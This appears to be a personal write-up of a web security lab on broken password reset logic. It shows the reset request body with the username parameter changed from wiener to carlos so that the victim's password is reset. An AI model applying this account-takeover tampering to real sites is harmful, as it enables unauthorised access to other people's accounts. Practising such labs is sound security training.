@@ -1,0 +1,24 @@
+Vulnerable - Broken password reset logic
+
+Goal: Access carlos "My account" page
+
+Given information:
+My credentials: Username: wiener , Password: peter
+
+Victim username: carlors
+
+Analysis:
+--------
+
+Reset wiener password
+
+after Entering the new password change username to carlos before sending the request
+
+temp-forgot-password-token=Sx6cA8i72jfIyxWu0EeNCOxfLnyXxpx9&username=wiener&new-password-1=peter&new-password-2=peter
+
+-> temp-forgot-password-token=Sx6cA8i72jfIyxWu0EeNCOxfLnyXxpx9&username=carlos&new-password-1=peter&new-password-2=peter
+
+
+Login with carlos accont using the new password you set
+
+Solved
